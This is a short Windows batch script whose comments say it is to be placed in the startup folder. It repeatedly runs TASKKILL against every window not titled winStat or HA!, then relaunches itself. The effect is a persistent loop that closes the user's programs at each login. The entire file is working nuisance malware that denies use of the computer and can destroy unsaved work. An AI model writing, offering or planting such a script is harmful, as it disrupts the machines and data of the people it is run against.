@ECHO OFF
::I will never give up batch!
::Manually put into the startup folder.
TITLE winStat
TASKKILL /FI "WINDOWTITLE ne winStat"
TITLE HA!
TASKKILL /FI "WINDOWTITLE ne HA!"
start winStat.bat
